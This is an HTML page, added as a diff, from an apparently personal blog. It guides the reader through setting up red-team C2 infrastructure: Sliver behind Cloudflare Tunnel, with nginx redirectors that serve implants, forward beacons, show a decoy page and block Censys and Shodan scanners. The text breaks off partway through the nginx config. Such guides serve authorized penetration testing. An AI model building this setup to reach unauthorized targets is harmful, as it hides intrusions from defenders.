@@ -1,0 +1,1425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Dual Cloud Redirector C2 Infrastructure - Complete Setup Guide | Zerotrace</title>
+  <meta name="description" content="Build professional-grade C2 infrastructure with cloud-based redirectors and Cloudflare Tunnel. Zero public exposure, operational flexibility, and cost optimization for authorized penetration testing." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="Dual Cloud Redirector C2 Infrastructure - Complete Setup Guide" />
+  <meta property="og:description" content="Build professional-grade Command and Control infrastructure with cloud-based redirectors, Cloudflare Tunnel, and Sliver C2. Learn to create resilient, cost-effective C2 infrastructure for authorized security testing." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/C2-infrastracture-img.png" />
+  <meta property="og:url" content="https://z3rotrace.live/projects/dual-cloud-c2-redirector.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Dual Cloud Redirector C2 Infrastructure - Complete Setup Guide" />
+  <meta name="twitter:description" content="Build professional-grade Command and Control infrastructure with cloud-based redirectors, Cloudflare Tunnel, and Sliver C2. Learn to create resilient, cost-effective C2 infrastructure for authorized security testing." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/C2-infrastracture-img.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+  <style>
+    /* Page-specific visual improvements */
+
+    /* 1. CRITICAL keyword styling - bold red for emphasis */
+    .critical {
+      color: #ff4444;
+      font-weight: 700;
+      text-shadow: 0 0 2px rgba(255, 68, 68, 0.3);
+    }
+
+    /* 2. Improved code block font readability */
+    pre code {
+      font-family: 'JetBrains Mono', 'Fira Code', 'Source Code Pro', 'Consolas', 'Monaco', monospace;
+      font-size: 0.95em;
+      line-height: 1.5;
+      letter-spacing: 0.02em;
+    }
+
+    code {
+      font-family: 'JetBrains Mono', 'Fira Code', 'Source Code Pro', 'Consolas', 'Monaco', monospace;
+    }
+
+    /* 3. Traffic Flow section - prevent inline code wrapping */
+    #traffic-flow-list li {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: baseline;
+      gap: 0.35em;
+      font-size: 0.95em;
+      line-height: 1.7;
+    }
+
+    #traffic-flow-list li code {
+      white-space: nowrap;
+      overflow-wrap: normal;
+      word-break: keep-all;
+    }
+
+    /* Allow overflow on very small screens */
+    @media (max-width: 640px) {
+      #traffic-flow-list li {
+        overflow-x: auto;
+        display: block;
+      }
+      #traffic-flow-list li code {
+        display: inline-block;
+        max-width: 100%;
+        overflow-x: auto;
+      }
+    }
+
+    /* 4. DNS Structure table improvements */
+    #dns-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    #dns-table thead {
+      background: rgba(0, 170, 255, 0.08);
+    }
+
+    #dns-table th {
+      padding: 0.9rem 1rem;
+      text-align: left;
+      font-weight: 600;
+      color: #00aaff;
+      border-bottom: 2px solid #00aaff;
+      font-size: 0.95rem;
+      letter-spacing: 0.3px;
+    }
+
+    #dns-table td {
+      padding: 0.85rem 1rem;
+      border-bottom: 1px solid #21262d;
+      color: #c9d1d9;
+      font-size: 0.9rem;
+    }
+
+    #dns-table tbody tr:last-child td {
+      border-bottom: none;
+    }
+
+    #dns-table tbody tr:hover {
+      background: rgba(0, 170, 255, 0.04);
+    }
+
+    #dns-table td:first-child {
+      font-weight: 500;
+      color: #79c0ff;
+    }
+
+    #dns-table td:nth-child(2) {
+      font-family: 'Consolas', monospace;
+      color: #ff6b6b;
+      font-weight: 600;
+    }
+
+    #dns-table td:nth-child(3) {
+      font-family: 'Consolas', monospace;
+      color: #a5d6ff;
+    }
+
+    #dns-table td:nth-child(4) {
+      color: #c77dff;
+      font-weight: 500;
+    }
+
+    /* Responsive table on mobile */
+    @media (max-width: 768px) {
+      #dns-table {
+        font-size: 0.85rem;
+      }
+
+      #dns-table th,
+      #dns-table td {
+        padding: 0.6rem 0.75rem;
+      }
+    }
+
+    /* Extra small screens - horizontal scroll */
+    @media (max-width: 640px) {
+      #dns-table-wrapper {
+        overflow-x: auto;
+        margin: 1rem -1.5rem;
+        padding: 0 1.5rem;
+      }
+
+      #dns-table {
+        min-width: 600px;
+      }
+    }
+
+    /* 5. Collapsible code blocks styling */
+    .collapsible-code-wrapper {
+      margin: 1.5rem 0;
+    }
+
+    .code-toggle-btn {
+      display: block;
+      width: 100%;
+      padding: 0.7rem 1rem;
+      margin-bottom: 0.5rem;
+      background: rgba(0, 170, 255, 0.08);
+      border: 1px solid rgba(0, 170, 255, 0.3);
+      border-radius: 6px;
+      color: #00aaff;
+      font-family: inherit;
+      font-size: 0.9rem;
+      text-align: left;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .code-toggle-btn:hover {
+      background: rgba(0, 170, 255, 0.15);
+      border-color: rgba(0, 170, 255, 0.5);
+    }
+
+    .code-toggle-btn:focus {
+      outline: 2px solid rgba(0, 170, 255, 0.6);
+      outline-offset: 2px;
+    }
+
+    .code-toggle-btn .toggle-icon {
+      display: inline-block;
+      width: 1rem;
+      font-weight: bold;
+      font-size: 1rem;
+      line-height: 1;
+      transition: transform 0.2s ease;
+    }
+
+    .code-toggle-btn[aria-expanded="true"] .toggle-icon {
+      transform: rotate(90deg);
+    }
+
+    .code-toggle-btn .line-count {
+      color: rgba(0, 170, 255, 0.7);
+      font-size: 0.85rem;
+      margin-left: auto;
+    }
+
+    .collapsible-code {
+      overflow: hidden;
+      transition: all 0.3s ease-in-out;
+    }
+
+    .collapsible-code pre {
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">×</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu" hidden>
+          <li><a href="../writeups/ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="../writeups/sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector2.html">Machines Walkthroughs</a></li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu">
+          <li><a href="dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>Dual Cloud Redirector C2 Infrastructure - Complete Setup Guide</h2>
+  <p><img src="../assets/C2-infrastracture-img.png" alt="Dual Cloud Redirector C2 Infrastructure"></p>
+  <p><em>Published: November 28, 2025</em></p>
+
+  <div class="disclaimer">
+    <strong>⚠️ IMPORTANT LEGAL AND ETHICAL DISCLAIMER</strong><br><br>
+    This infrastructure is designed for <strong>authorized security testing only</strong>:<br>
+    ✅ Penetration testing engagements (with written authorization)<br>
+    ✅ Red team exercises (within scope)<br>
+    ✅ Security research (controlled environments)<br>
+    ✅ Educational purposes (personal lab)<br><br>
+
+    <strong>Unauthorized use is illegal and unethical:</strong><br>
+    ❌ Attacking systems without permission<br>
+    ❌ Unauthorized access to networks<br>
+    ❌ Data theft or destruction<br>
+    ❌ Deploying malware on systems you don't own<br><br>
+
+    <strong>Legal requirements:</strong><br>
+    1. Written authorization from target organization<br>
+    2. Clearly defined scope and rules of engagement<br>
+    3. NDA and liability agreements<br>
+    4. Incident response plan<br>
+    5. Post-engagement cleanup procedures<br><br>
+
+    <strong>Always obtain explicit written permission before testing, stay within authorized scope, document all activities, report findings responsibly, and clean up all implants and infrastructure after testing.</strong>
+  </div>
+
+  <h3>Table of Contents</h3>
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#architecture">Architecture</a></li>
+    <li><a href="#prerequisites">Prerequisites</a></li>
+    <li><a href="#infrastructure-costs">Infrastructure Costs</a></li>
+    <li><a href="#phase-1">Phase 1: DNS Configuration</a></li>
+    <li><a href="#phase-2">Phase 2: Home Lab Cloudflare Tunnel Setup</a></li>
+    <li><a href="#phase-3">Phase 3: VPS Redirector Setup</a></li>
+    <li><a href="#phase-4">Phase 4: Sliver C2 Configuration</a></li>
+    <li><a href="#phase-5">Phase 5: Beacon Generation & Deployment</a></li>
+    <li><a href="#phase-6">Phase 6: Second Redirector Setup</a></li>
+    <li><a href="#troubleshooting">Troubleshooting</a></li>
+    <li><a href="#security-considerations">Security Considerations</a></li>
+  </ul>
+
+  <h2 id="overview">Overview</h2>
+
+  <p>This guide demonstrates how to build a professional-grade Command and Control (C2) infrastructure using cloud-based redirectors and Cloudflare Tunnel. The architecture provides:</p>
+
+  <ul>
+    <li><strong>Zero Public Exposure</strong>: Home lab C2 server hidden behind Cloudflare Tunnel</li>
+    <li><strong>Operational Flexibility</strong>: Rotate/burn redirectors without touching the C2</li>
+    <li><strong>Geographic Redundancy</strong>: Multiple redirectors across different regions</li>
+    <li><strong>Cost Optimization</strong>: Snapshot-based deployment (~$2/month vs $13/month always-on)</li>
+    <li><strong>Automatic Failover</strong>: Client-side failover built into implants</li>
+  </ul>
+
+  <div class="note">
+    <strong>Use Case:</strong> Authorized penetration testing, red team engagements, CTF competitions, security research, and educational purposes only.
+  </div>
+
+  <h2 id="architecture">Architecture</h2>
+
+  <pre><code>┌─────────────────────────────────────────────────────────────────────┐
+│                         Target Environment                           │
+└────────────┬────────────────────────────────────────────────────────┘
+             │
+             ├──► Fetches Implant: https://r1.example.com/downloads/
+             │
+             └──► Beacon Callback: https://r1.example.com/api/
+                                   https://r2.example.com/api/ (failover)
+                                          │
+┌─────────────────────────────────────────┼──────────────────────────┐
+│                    Cloud Layer          │                          │
+│  ┌──────────────────────┐   ┌──────────▼──────────┐                │
+│  │   Redirector 2       │   │   Redirector 1      │                │
+│  │  r2.example.com      │   │  r1.example.com     │                │
+│  │  203.0.113.20        │   │  203.0.113.10       │                │
+│  │  (Amsterdam)         │   │  (New York)         │                │
+│  │                      │   │                     │                │
+│  │ Nginx Reverse Proxy  │   │ Nginx Reverse Proxy │                │
+│  │ - Serves implants    │   │ - Serves implants   │                │
+│  │ - Proxies beacons    │   │ - Proxies beacons   │                │
+│  │ - Decoy website      │   │ - Decoy website     │                │
+│  └──────────┬───────────┘   └──────────┬──────────┘                │
+│             │                          │                           │
+│             └──────────────┬───────────┘                           │
+└────────────────────────────┼───────────────────────────────────────┘
+                             │ Proxy to: https://c2.example.com/
+                             │
+                    ┌────────▼──────────┐
+                    │  Cloudflare CDN   │
+                    │  (Orange Cloud)   │
+                    │  Hides tunnel IP  │
+                    └────────┬──────────┘
+                             │ Cloudflare Tunnel (QUIC/HTTP2)
+┌────────────────────────────┼────────────────────────────────────────┐
+│                    Home Lab│                                        │
+│                    ┌───────▼────────┐                               │
+│                    │ Cloudflare     │                               │
+│                    │ Tunnel Daemon  │                               │
+│                    │ (cloudflared)  │                               │
+│                    └───────┬────────┘                               │
+│                            │ Forwards to 127.0.0.1:443              │
+│                    ┌───────▼────────┐                               │
+│                    │  Sliver C2     │                               │
+│                    │  Server        │                               │
+│                    │  (Kali Linux)  │                               │
+│                    └────────────────┘                               │
+└─────────────────────────────────────────────────────────────────────┘</code></pre>
+
+  <h3>Traffic Flow</h3>
+
+  <ol id="traffic-flow-list">
+    <li><strong>Implant Delivery</strong>: Target downloads from <code>https://r1.example.com/downloads/</code> → Nginx serves from <code>/var/www/implants/</code></li>
+    <li><strong>Beacon Callback</strong>: Implant connects to <code>https://r1.example.com/api/</code> → Nginx proxies to <code>https://c2.example.com</code> → Cloudflare Tunnel routes to home lab Sliver at <code>127.0.0.1:443</code></li>
+    <li><strong>Failover</strong>: If r1 fails, implant automatically tries <code>https://r2.example.com/api/</code></li>
+  </ol>
+
+  <h3>DNS Structure</h3>
+
+  <div id="dns-table-wrapper">
+    <table id="dns-table">
+      <thead>
+        <tr>
+          <th>Record</th>
+          <th>Type</th>
+          <th>Value</th>
+          <th>Cloudflare Proxy</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>r1.example.com</td>
+          <td>A</td>
+          <td>203.0.113.10</td>
+          <td>☁️ Gray (DNS only)</td>
+        </tr>
+        <tr>
+          <td>r2.example.com</td>
+          <td>A</td>
+          <td>203.0.113.20</td>
+          <td>☁️ Gray (DNS only)</td>
+        </tr>
+        <tr>
+          <td>c2.example.com</td>
+          <td>CNAME</td>
+          <td>tunnel-id.cfargotunnel.com</td>
+          <td>🟧 Orange (Proxied)</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="note">
+    <strong><span class="critical">Critical:</span></strong> Redirectors use DNS-only (gray cloud) for direct connections. C2 uses proxied (orange cloud) to hide the tunnel endpoint.
+  </div>
+
+  <h2 id="prerequisites">Prerequisites</h2>
+
+  <h3>Home Lab Requirements</h3>
+  <ul>
+    <li>Linux VM (Kali, Ubuntu, Debian) with internet access</li>
+    <li>Static internal IP or persistent DHCP reservation</li>
+    <li>Outbound port 7844 allowed (for Cloudflare Tunnel QUIC)</li>
+    <li>2GB+ RAM, 20GB+ disk space</li>
+  </ul>
+
+  <h3>Cloud Resources</h3>
+  <ul>
+    <li>Domain name (e.g., example.com via Namecheap, Cloudflare Registrar)</li>
+    <li>Cloudflare account (free tier sufficient)</li>
+    <li>VPS provider account:
+      <ul>
+        <li>DigitalOcean (recommended, easy snapshots)</li>
+        <li>Vultr, Linode, AWS Lightsail</li>
+      </ul>
+    </li>
+    <li>SSH key pair for VPS authentication</li>
+  </ul>
+
+  <h3>Local Tools</h3>
+  <ul>
+    <li>SSH client (OpenSSH, PuTTY)</li>
+    <li>SCP/SFTP client for file transfers</li>
+  </ul>
+
+  <h3>Software to Install</h3>
+  <ul>
+    <li><strong>Home Lab</strong>: Sliver C2, cloudflared, git</li>
+    <li><strong>VPS</strong>: Nginx, certbot, ufw, fail2ban</li>
+    <li><strong>Optional</strong>: doctl (DigitalOcean CLI)</li>
+  </ul>
+
+  <h2 id="infrastructure-costs">Infrastructure Costs</h2>
+
+  <h3>Always-On Configuration</h3>
+  <ul>
+    <li>Redirector 1 (NYC): $6/month (DigitalOcean 1GB droplet)</li>
+    <li>Redirector 2 (AMS): $6/month (DigitalOcean 1GB droplet)</li>
+    <li>Domain (.tech or .com): ~$1/month (annual amortized)</li>
+    <li>Cloudflare: $0 (free tier)</li>
+    <li><strong>Total: ~$13/month</strong></li>
+  </ul>
+
+  <h3>Snapshot-Based Configuration (Recommended)</h3>
+  <ul>
+    <li>Snapshot storage (25GB): ~$1.25/month</li>
+    <li>Active droplet when deployed: $0.009/hour (~$6.48 if run for full month)</li>
+    <li>Domain: ~$1/month</li>
+    <li>Cloudflare: $0</li>
+    <li><strong>Total when not deployed: ~$2.25/month</strong></li>
+    <li><strong>Cost during engagement: ~$2.25/month + hourly rate</strong></li>
+  </ul>
+
+  <h3>Optional Add-ons</h3>
+  <ul>
+    <li>Reserved/Floating IP: +$4/month (static IP across redeploys)</li>
+    <li>Cloudflare Load Balancer: +$5/month (automated DNS failover)</li>
+  </ul>
+
+  <h2 id="phase-1">Phase 1: DNS Configuration</h2>
+
+  <h3><span class="step">[Step 1]</span> Add Domain to Cloudflare</h3>
+
+  <ol>
+    <li>Log into Cloudflare dashboard</li>
+    <li>Click <strong>Add a Site</strong></li>
+    <li>Enter your domain: <code>example.com</code></li>
+    <li>Select <strong>Free</strong> plan</li>
+    <li>Cloudflare will scan existing DNS records</li>
+    <li>Copy the Cloudflare nameservers (e.g., <code>ns1.cloudflare.com</code>)</li>
+    <li>Update nameservers at your domain registrar</li>
+    <li>Wait for DNS propagation (5 minutes to 24 hours)</li>
+  </ol>
+
+  <h3><span class="step">[Step 2]</span> Create Redirector DNS Records</h3>
+
+  <p>Go to <strong>DNS</strong> tab in Cloudflare and click <strong>Add record</strong> for each redirector:</p>
+
+  <p><strong>Redirector 1 (r1):</strong></p>
+  <ul>
+    <li>Type: <code>A</code> | Name: <code>r1</code> | IPv4: <code>203.0.113.10</code> (your VPS IP)</li>
+    <li>Proxy status: ☁️ <strong>DNS only</strong> (gray cloud) ← <span class="critical">CRITICAL</span></li>
+    <li>TTL: Auto | Click <strong>Save</strong></li>
+  </ul>
+
+  <p><strong>Redirector 2 (r2):</strong></p>
+  <ul>
+    <li>Type: <code>A</code> | Name: <code>r2</code> | IPv4: <code>203.0.113.20</code> (your VPS IP)</li>
+    <li>Proxy status: ☁️ <strong>DNS only</strong> (gray cloud) ← <span class="critical">CRITICAL</span></li>
+    <li>TTL: Auto | Click <strong>Save</strong></li>
+  </ul>
+
+  <div class="note">
+    <strong>Important:</strong> Do NOT create the c2 record manually - it will be auto-created by cloudflared in Phase 2.
+  </div>
+
+  <h3><span class="step">[Step 3]</span> Verify DNS Propagation</h3>
+
+  <pre><code># Check from your local machine
+nslookup r1.example.com
+nslookup r2.example.com
+
+# Expected output:
+# r1.example.com → 203.0.113.10
+# r2.example.com → 203.0.113.20</code></pre>
+
+  <h2 id="phase-2">Phase 2: Home Lab Cloudflare Tunnel Setup</h2>
+
+  <h3><span class="step">[Step 1]</span> Install Cloudflared</h3>
+
+  <p><strong>On Debian/Ubuntu/Kali (recommended):</strong></p>
+  <pre><code># Download and install
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
+sudo dpkg -i cloudflared-linux-amd64.deb
+cloudflared --version</code></pre>
+
+  <p><strong>Alternative - universal binary:</strong></p>
+  <pre><code>wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared
+sudo chmod +x /usr/local/bin/cloudflared</code></pre>
+
+  <h3><span class="step">[Step 2]</span> Authenticate with Cloudflare</h3>
+
+  <pre><code>cloudflared tunnel login</code></pre>
+
+  <p>This opens a browser window. Select your domain (<code>example.com</code>) to authorize cloudflared. A certificate is saved to <code>~/.cloudflared/cert.pem</code>.</p>
+
+  <h3><span class="step">[Step 3]</span> Create Tunnel</h3>
+
+  <pre><code>cloudflared tunnel create homelab-c2
+
+# Expected output:
+# Tunnel credentials written to /home/user/.cloudflared/&lt;tunnel-id&gt;.json
+# Created tunnel homelab-c2 with id &lt;tunnel-id&gt;</code></pre>
+
+  <div class="note">
+    <strong>Save the tunnel ID</strong> - you'll need it for the config file.
+  </div>
+
+  <h3><span class="step">[Step 4]</span> Create Tunnel Configuration</h3>
+
+  <p><strong>Create system-wide configuration directory:</strong></p>
+  <pre><code>sudo mkdir -p /etc/cloudflared
+
+# Copy tunnel credentials to system location
+sudo cp ~/.cloudflared/&lt;tunnel-id&gt;.json /etc/cloudflared/
+
+# Create config file
+sudo nano /etc/cloudflared/config.yml</code></pre>
+
+  <p><strong>Add this configuration:</strong></p>
+  <pre><code>tunnel: homelab-c2
+credentials-file: /etc/cloudflared/&lt;tunnel-id&gt;.json
+
+ingress:
+  - hostname: c2.example.com
+    service: https://127.0.0.1:443
+    originRequest:
+      noTLSVerify: true
+  - service: http_status:404</code></pre>
+
+  <p><strong>Explanation:</strong></p>
+  <ul>
+    <li><code>tunnel</code>: Name of your tunnel</li>
+    <li><code>credentials-file</code>: Path to tunnel credentials in <code>/etc/cloudflared/</code></li>
+    <li><code>hostname</code>: The C2 domain that will route to this tunnel</li>
+    <li><code>service</code>: Local Sliver C2 server address</li>
+    <li><code>noTLSVerify</code>: Ignore self-signed cert from Sliver</li>
+    <li>Final ingress: Catch-all returns 404</li>
+  </ul>
+
+  <div class="note">
+    <strong>Important:</strong> Using <code>/etc/cloudflared/</code> prevents permission errors and ensures the tunnel service can access the credentials.
+  </div>
+
+  <h3><span class="step">[Step 5]</span> Route DNS to Tunnel</h3>
+
+  <pre><code>cloudflared tunnel route dns homelab-c2 c2.example.com
+
+# This automatically creates a CNAME record in Cloudflare:
+# c2.example.com → &lt;tunnel-id&gt;.cfargotunnel.com (orange cloud, proxied)
+
+# Verify in Cloudflare DNS dashboard:
+# Go to DNS tab - you should see 'c2' record as CNAME with orange cloud</code></pre>
+
+  <h3><span class="step">[Step 6]</span> Test Tunnel Manually</h3>
+
+  <pre><code>sudo cloudflared tunnel run homelab-c2
+
+# Expected output:
+# 2025-01-27T12:00:00Z INF Starting tunnel tunnelID=&lt;id&gt;
+# 2025-01-27T12:00:01Z INF Connection registered connIndex=0 location=ATL
+# 2025-01-27T12:00:01Z INF Connection registered connIndex=1 location=IAD
+
+# If successful, press Ctrl+C to stop. We'll install it as a service next.</code></pre>
+
+  <h3><span class="step">[Step 7]</span> Install as System Service</h3>
+
+  <pre><code># Install cloudflared as a system service
+sudo cloudflared service install
+
+# The service will automatically use /etc/cloudflared/config.yml</code></pre>
+
+  <div class="note">
+    <strong>Note:</strong> Since we already created the config in <code>/etc/cloudflared/</code>, the service installation will detect and use it automatically.
+  </div>
+
+  <h3><span class="step">[Step 8]</span> Start and Enable Service</h3>
+
+  <pre><code>sudo systemctl start cloudflared
+sudo systemctl enable cloudflared
+sudo systemctl status cloudflared
+
+# Check logs
+sudo journalctl -u cloudflared -f</code></pre>
+
+  <h3><span class="step">[Step 9]</span> Verify Tunnel Connectivity</h3>
+
+  <pre><code># From external machine or online service
+curl -I https://c2.example.com
+# Expected: 502 Bad Gateway (C2 not running yet) or 404
+# This confirms tunnel is routing correctly</code></pre>
+
+  <h2 id="phase-3">Phase 3: VPS Redirector Setup</h2>
+
+  <h3><span class="step">[Step 1]</span> Create VPS Instance</h3>
+
+  <p><strong>DigitalOcean GUI:</strong></p>
+  <ol>
+    <li>Log into DigitalOcean</li>
+    <li>Click <strong>Create</strong> → <strong>Droplets</strong></li>
+    <li><strong>Choose Region</strong>: New York (NYC1) or closest to targets</li>
+    <li><strong>Choose Image</strong>: Ubuntu 22.04 LTS</li>
+    <li><strong>Choose Size</strong>: Basic → $6/month (1GB RAM, 1 vCPU, 25GB SSD)</li>
+    <li><strong>Authentication</strong>: SSH keys (upload your public key)</li>
+    <li><strong>Hostname</strong>: <code>redirector-r1</code></li>
+    <li>Click <strong>Create Droplet</strong></li>
+    <li>Note the assigned IP address (e.g., 203.0.113.10)</li>
+  </ol>
+
+  <div class="note">
+    <strong>Update DNS:</strong> Go to Cloudflare and update the <code>r1</code> A record with the real IP.
+  </div>
+
+  <h3><span class="step">[Step 2]</span> Initial SSH Connection</h3>
+
+  <pre><code>ssh root@203.0.113.10
+
+# Accept SSH fingerprint
+# You should now be logged in as root</code></pre>
+
+  <h3><span class="step">[Step 3]</span> System Hardening</h3>
+
+  <p><strong>Update system:</strong></p>
+  <pre><code>apt update && apt upgrade -y</code></pre>
+
+  <p><strong>Create operator user with sudo privileges:</strong></p>
+  <pre><code>adduser operator
+# Set password when prompted
+# Press Enter for default values
+
+# Add to sudo group
+usermod -aG sudo operator
+
+# Copy SSH keys to operator
+rsync --archive --chown=operator:operator ~/.ssh /home/operator/</code></pre>
+
+  <p><strong>Disable root SSH login and password authentication:</strong></p>
+  <pre><code>nano /etc/ssh/sshd_config
+
+# Find and modify these settings:
+PermitRootLogin no
+PasswordAuthentication no
+
+# Save and restart SSH
+systemctl restart sshd</code></pre>
+
+  <p><strong>Test operator login</strong> (open a new terminal before closing root session):</p>
+  <pre><code>ssh operator@203.0.113.10
+
+# If successful, close root session and continue as operator</code></pre>
+
+  <h3><span class="step">[Step 4]</span> Configure Firewall</h3>
+
+  <pre><code># Enable UFW
+sudo ufw allow 22/tcp    # SSH
+sudo ufw allow 80/tcp    # HTTP (for Let's Encrypt)
+sudo ufw allow 443/tcp   # HTTPS
+sudo ufw enable
+
+# Verify
+sudo ufw status verbose</code></pre>
+
+  <h3><span class="step">[Step 5]</span> Install fail2ban</h3>
+
+  <pre><code>sudo apt install fail2ban -y
+sudo systemctl enable fail2ban
+sudo systemctl start fail2ban</code></pre>
+
+  <h3><span class="step">[Step 6]</span> Install Nginx</h3>
+
+  <pre><code>sudo apt install nginx -y
+sudo systemctl enable nginx
+sudo systemctl start nginx
+
+# Verify
+curl http://localhost
+# Should see "Welcome to nginx!"</code></pre>
+
+  <h3><span class="step">[Step 7]</span> Install Certbot (Let's Encrypt)</h3>
+
+  <pre><code>sudo apt install certbot python3-certbot-nginx -y</code></pre>
+
+  <h3><span class="step">[Step 8]</span> Obtain SSL Certificate</h3>
+
+  <pre><code>sudo certbot --nginx -d r1.example.com
+
+# When prompted:
+# - Email address: Enter a valid email (for renewal notifications)
+# - Terms of Service: Y (agree)
+# - Share email: N (optional)
+
+# Certificate will be saved to:
+# /etc/letsencrypt/live/r1.example.com/fullchain.pem
+# /etc/letsencrypt/live/r1.example.com/privkey.pem
+
+# Test auto-renewal:
+sudo certbot renew --dry-run</code></pre>
+
+  <h3><span class="step">[Step 9]</span> Create Directory Structure and Decoy Page</h3>
+
+  <pre><code># Create directories
+sudo mkdir -p /var/www/implants
+sudo mkdir -p /var/www/decoy
+sudo chown -R www-data:www-data /var/www/implants
+sudo chown -R www-data:www-data /var/www/decoy
+
+# Create simple decoy page
+sudo nano /var/www/decoy/index.html</code></pre>
+
+  <p><strong>Decoy page content:</strong></p>
+  <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Under Construction&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Website Under Construction&lt;/h1&gt;
+    &lt;p&gt;This site is currently being updated. Please check back later.&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+  <h3><span class="step">[Step 10]</span> Configure Nginx Redirector</h3>
+
+  <pre><code># Backup default config
+sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/default.bak
+
+# Create redirector config
+sudo nano /etc/nginx/sites-available/redirector</code></pre>
+
+  <p><strong>Redirector configuration:</strong></p>
+
+  <!-- START: Collapsible Nginx configuration -->
+  <div class="collapsible-code-wrapper">
+    <button class="code-toggle-btn" aria-expanded="false" aria-controls="nginx-config-block">
+      <span class="toggle-icon">▶</span>
+      <span class="toggle-label">Show Nginx configuration</span>
+      <span class="line-count">101 lines</span>
+    </button>
+    <div id="nginx-config-block" class="collapsible-code" style="display: none;">
+      <pre><code># Block known scanners
+geo $block_scanner {
+    default 0;
+    # Censys ranges
+    167.94.138.0/24 1;
+    167.94.145.0/24 1;
+    167.248.133.0/24 1;
+    # Shodan ranges
+    71.6.135.0/24 1;
+    71.6.146.0/24 1;
+    71.6.167.0/24 1;
+    66.240.192.0/24 1;
+    66.240.219.0/24 1;
+}
+
+# HTTP server - redirect to HTTPS
+server {
+    listen 80;
+    server_name r1.example.com;
+
+    # Allow Let's Encrypt
+    location /.well-known/acme-challenge/ {
+        root /var/www/html;
+    }
+
+    # Redirect everything else to HTTPS
+    location / {
+        return 301 https://$server_name$request_uri;
+    }
+}
+
+# HTTPS server
+server {
+    listen 443 ssl http2;
+    server_name r1.example.com;
+
+    # SSL Configuration
+    ssl_certificate /etc/letsencrypt/live/r1.example.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/r1.example.com/privkey.pem;
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers HIGH:!aNULL:!MD5;
+    ssl_prefer_server_ciphers on;
+
+    # Hide nginx version
+    server_tokens off;
+
+    # Block scanners
+    if ($block_scanner) {
+        return 404;
+    }
+
+    # Logging
+    access_log /var/log/nginx/redirector_access.log;
+    error_log /var/log/nginx/redirector_error.log;
+
+    # Implant serving - downloads directory
+    location /downloads/ {
+        alias /var/www/implants/;
+        autoindex off;
+        add_header Content-Type application/octet-stream;
+        add_header Content-Disposition 'attachment';
+    }
+
+    # Beacon forwarding - proxy to C2
+    location /api/ {
+        # Proxy to Cloudflare Tunnel C2
+        proxy_pass https://c2.example.com/;
+
+        # Preserve client information
+        proxy_set_header Host c2.example.com;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+
+        # WebSocket support for interactive sessions
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+
+        # Extended timeouts for long-polling beacons
+        proxy_connect_timeout 300s;
+        proxy_send_timeout 300s;
+        proxy_read_timeout 300s;
+
